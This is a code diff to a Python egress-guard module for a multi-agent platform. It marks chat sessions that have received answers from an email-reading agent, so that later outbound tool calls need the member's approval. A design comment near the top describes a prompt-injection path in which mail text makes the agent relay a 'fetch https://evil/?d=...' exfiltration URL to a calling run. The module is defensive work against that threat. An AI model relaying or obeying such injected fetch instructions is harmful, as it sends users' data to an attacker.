@@ -35,7 +35,9 @@ from __future__ import annotations
 
 import contextlib
 import sys
+import threading
 import weakref
+from collections import OrderedDict
 from collections.abc import Iterable, Mapping
 from typing import Any
 
@@ -49,16 +51,29 @@ _log = get_logger("acb_skills.egress")
 __all__ = [
     "DELEGATION_TOOLS",
     "EGRESS_WITHHELD_ANSWER",
+    "MARK_CACHE_MAX",
+    "MARK_CLEAR",
+    "MARK_MARKED",
+    "MARK_NAMESPACE",
+    "MARK_TTL_S",
+    "MARK_UNKNOWN",
     "MCP_LOADER_KEY",
     "NO_EGRESS_KEY",
     "STORE_WRITES",
+    "UNTRUSTED_INPUT_AGENTS",
     "EgressGuardProvider",
     "RefuseEgressTools",
     "WithholdEgressTools",
     "egress_tool_names",
     "has_explicit_open_world",
+    "is_delegation_tool",
     "is_egress_tool",
+    "mark_untrusted_answer",
     "no_egress_for_this_run",
+    "read_untrusted_answer",
+    "session_is_known_marked",
+    "session_is_marked",
+    "session_mark_state",
     "tool_name",
 ]
 
@@ -87,6 +102,258 @@ DELEGATION_TOOLS: frozenset[str] = frozenset({
 STORE_WRITES: frozenset[str] = frozenset({
     "save_memory", "save_episode", "save_agent_memory", "save_org_memory", "save_note",
 })
+
+# ── An answer from an agent that reads stranger text (WS-17 EM-G11d) ────────
+#
+# ``email_app_master_plan.md`` §12.3.13.8. The email assistant reads mail that
+# a stranger wrote. H-236 holds what it reaches DOWN (each run it delegates to
+# binds ``no_egress``). Round 2 holds what it sends UP: its answer to
+# ``call_agent`` can relay "fetch https://evil/?d=..." from a mail, and the
+# calling run (Projects) keeps ``fetch_page``.
+#
+# So ``agent_tools`` frames that answer, and it marks the CHAT SESSION of the
+# calling run (:func:`mark_untrusted_answer`). Round 3: the relayed URL stays in
+# the thread on the next turn, and each turn is a new run, so the mark is keyed
+# by the session and not by the run id. The key is the run's tenant and its
+# session, each from the server-bound run context (R11), never from a request
+# field. Round 4: the member is NOT in the key. In a shared room, member B's
+# turn reads the URL that member A's turn relayed, so B's turn is held too. The mark lives in Redis through the tenant prefix wrapper
+# (``acb_common.tenant_redis``), with :data:`MARK_TTL_S`, so every process and
+# every later turn sees it. Each read that finds it slides the TTL.
+#
+# Readers: ``permission_policy.decide`` gives each egress call of a marked
+# session the code ``untrusted_answer_confirm`` (the member's card first, a
+# refusal with no card channel), and ``agent_tools`` delegates with
+# ``no_egress`` from a marked session. The async readers
+# (:func:`session_is_marked`) read a process cache, and on a miss they ask
+# Redis. They FAIL CLOSED where a card can show: Redis that does not answer
+# reads as marked. A batch session never asks Redis (round 4). The sync
+# readers (:func:`read_untrusted_answer`: the Copilot guard and a sync tool)
+# read only the process cache. The cache holds positives only, with a bound
+# (:data:`MARK_CACHE_MAX`). A sync reader misses a mark that this process
+# never saw or evicted, and §12.3.13.8 records that residual risk. Fences:
+# ``tests/unit/test_delegation_no_egress.py`` and ``test_untrusted_frame.py``.
+
+#: Agents whose context holds text that a stranger wrote. The orchestrator
+#: reads the same set (``_tool_injection``), so one list names them.
+UNTRUSTED_INPUT_AGENTS: frozenset[str] = frozenset({"email-assistant"})
+
+#: The Redis namespace of the session marks (``cc:<org>:egress-mark:...``).
+MARK_NAMESPACE = "egress-mark"
+#: The lifetime of a mark, slid by each read that finds it. Chats have no
+#: retention limit today, so this is long: 400 days of no use. Owner note in
+#: ``email_app_master_plan.md`` 12.3.13.8.
+MARK_TTL_S = 400 * 24 * 3600
+
+#: The bound of the process cache of marks (round 4).
+MARK_CACHE_MAX = 16384
+
+
+class _PositiveLRU:
+    """The sessions this process saw marked: ``(org, session)``. It holds
+    positives only, and it keeps the :data:`MARK_CACHE_MAX` most recent.
+
+    An eviction never reads as "unmarked" to an async reader: a miss there
+    asks Redis, and Redis keeps the mark. Each hit moves the session to the
+    end, so a session that a run uses now is the last one to go. Hold
+    ``_MARKED_LOCK`` around each call."""
+
+    def __init__(self, bound: int) -> None:
+        self._bound = bound
+        self._items: OrderedDict[tuple[str, str], None] = OrderedDict()
+
+    def add(self, session: tuple[str, str]) -> None:
+        self._items[session] = None
+        self._items.move_to_end(session)
+        while len(self._items) > self._bound:
+            self._items.popitem(last=False)
+
+    def __contains__(self, session: object) -> bool:
+        if session not in self._items:
+            return False
+        self._items.move_to_end(session)  # type: ignore[arg-type]
+        return True
+
+    def __len__(self) -> int:
+        return len(self._items)
+
+    def clear(self) -> None:
+        self._items.clear()
+
+
+_MARKED_SESSIONS = _PositiveLRU(MARK_CACHE_MAX)
+_MARKED_LOCK = threading.Lock()
+
+
+def _session_of(ctx: Mapping[str, Any] | None = None) -> tuple[str, str] | None:
+    """``(org, session)`` of the run on this frame, or None.
+
+    The tenant is the run's bound tenant (``acb_common.db.current_tenant``),
+    and the session comes from the run's bound artifact context. Neither
+    comes from a request field or a tool argument. The member is not part of
+    the key, because members of a shared room read one thread."""
+    try:
+        if ctx is None:
+            from acb_skills.write_artifact import artifact_context
+
+            ctx = artifact_context()
+        from acb_common.db import current_tenant
+
+        org = str(current_tenant() or "")
+    except Exception:
+        return None
+    session = str((ctx or {}).get("session_id") or "")
+    if not (org and session):
+        return None
+    return org, session
+
+
+def _bound_context() -> Mapping[str, Any]:
+    try:
+        from acb_skills.write_artifact import artifact_context
+
+        return artifact_context() or {}
+    except Exception:
+        return {}
+
+
+def _minted_session(ctx: Mapping[str, Any] | None) -> bool:
+    """True for a session that a BATCH run minted (H-227 ``batch_thread``).
+    The executor sets the flag, never a request. No other run shares that
+    session, so no other process can mark it, and Redis holds nothing."""
+    return bool((ctx or {}).get("batch_thread") is True)
+
+
+def _card_can_show(ctx: Mapping[str, Any] | None) -> bool:
+    """True when the run can show the member's card: a member, no batch run
+    and no WhatsApp run. Only such a run fails closed on a Redis fault."""
+    ctx = ctx or {}
+    if not ctx.get("member") or ctx.get("batch_thread") is True:
+        return False
+    try:
+        from acb_skills.whatsapp_ui import current_run
+
+        return current_run() is None
+    except Exception:
+        return True
+
+
+def get_tenant_redis() -> Any:
+    """The tenant Redis client. A seam, so a test passes a fake client."""
+    from acb_common.tenant_redis import get_tenant_redis as _client
+
+    return _client()
+
+
+async def mark_untrusted_answer() -> bool:
+    """Mark the chat session of the run on this frame: it read the answer of
+    an agent of :data:`UNTRUSTED_INPUT_AGENTS`. Returns False when the frame
+    names no session or the write failed. The process set is marked either
+    way, so this process holds the mark at once."""
+    session = _session_of()
+    if session is None:
+        _log.warning("egress.untrusted_answer_unmarked")
+        return False
+    with _MARKED_LOCK:
+        _MARKED_SESSIONS.add(session)
+    if _minted_session(_bound_context()):
+        _log.info("egress.untrusted_answer_marked", store="process")
+        return True
+    org, thread = session
+    try:
+        from acb_common.tenant_redis import key, organization_scope
+
+        with organization_scope(org):
+            await get_tenant_redis().setex(
+                key(MARK_NAMESPACE, thread), MARK_TTL_S, "1")
+    except Exception as exc:  # the class only: a value never reaches a log
+        _log.warning("egress.untrusted_answer_mark_failed", error=type(exc).__name__)
+        return False
+    _log.info("egress.untrusted_answer_marked")
+    return True
+
+
+#: The three answers of :func:`session_mark_state`.
+MARK_MARKED = "marked"
+MARK_CLEAR = "clear"
+MARK_UNKNOWN = "unknown"
+
+def is_delegation_tool(tool: Any) -> bool:
+    """True for a tool that starts another agent's run: one of
+    :data:`DELEGATION_TOOLS`, or a specialist tool of the orchestrator, which
+    carries ``__delegates_to__`` (``orchestrator.agents``). A delegation is
+    not an egress act by itself, because each egress tool of the run it
+    starts has its own gate. So an UNKNOWN mark asks no card for it."""
+    if getattr(tool, "__delegates_to__", None):
+        return True
+    return (tool if isinstance(tool, str) else tool_name(tool)) in DELEGATION_TOOLS
+
+
+async def session_mark_state(ctx: Mapping[str, Any] | None = None) -> str:
+    """The mark of the chat session of the run on this frame.
+
+    :data:`MARK_MARKED` when this process or Redis holds the mark,
+    :data:`MARK_CLEAR` when Redis answers that it does not, and
+    :data:`MARK_UNKNOWN` when Redis does not answer in a run that can show a
+    card. A run that cannot show a card reads its process cache on a fault.
+    A frame with no tenant or no session has nothing to key, and is clear."""
+    session = _session_of(ctx)
+    if session is None:
+        return MARK_CLEAR
+    with _MARKED_LOCK:
+        if session in _MARKED_SESSIONS:
+            return MARK_MARKED
+    if ctx is None:
+        ctx = _bound_context()
+    if _minted_session(ctx):
+        # A batch run minted this session, so only this process can mark it.
+        return MARK_CLEAR
+    org, thread = session
+    try:
+        from acb_common.tenant_redis import key, organization_scope
+
+        with organization_scope(org):
+            client = get_tenant_redis()
+            mark = key(MARK_NAMESPACE, thread)
+            if not await client.exists(mark):
+                return MARK_CLEAR
+            await client.expire(mark, MARK_TTL_S)
+    except Exception as exc:
+        unknown = _card_can_show(ctx)
+        _log.warning("egress.untrusted_answer_read_failed",
+                     error=type(exc).__name__, fail_closed=unknown)
+        # Unknown only where a card can show, so the member can still
+        # approve. A run with no card channel would lose each egress call.
+        return MARK_UNKNOWN if unknown else MARK_CLEAR
+    with _MARKED_LOCK:
+        _MARKED_SESSIONS.add(session)
+    return MARK_MARKED
+
+
+async def session_is_marked(ctx: Mapping[str, Any] | None = None) -> bool:
+    """The reader of an EGRESS TOOL gate: True when the session is marked,
+    and also when the state is unknown. It FAILS CLOSED, so the call asks
+    the member's card. It never removes a tool."""
+    return await session_mark_state(ctx) != MARK_CLEAR
+
+
+async def session_is_known_marked(ctx: Mapping[str, Any] | None = None) -> bool:
+    """The reader of a DELEGATION: True only for a known mark. A Redis fault
+    never binds ``no_egress`` on the run that a delegation starts, so a
+    blip never holds a send. Each egress tool of that run still asks its
+    card through :func:`session_is_marked`."""
+    return await session_mark_state(ctx) == MARK_MARKED
+
+
+def read_untrusted_answer(ctx: Mapping[str, Any] | None = None) -> bool:
+    """The sync reader: True when this process saw the session of the run on
+    this frame marked. The Copilot guard and a sync tool read it, because
+    they cannot wait for Redis."""
+    session = _session_of(ctx)
+    if session is None:
+        return False
+    with _MARKED_LOCK:
+        return session in _MARKED_SESSIONS
 
 #: The answer to a call that the control refuses. It names what is true of
 #: this run and claims nothing about the whole platform.
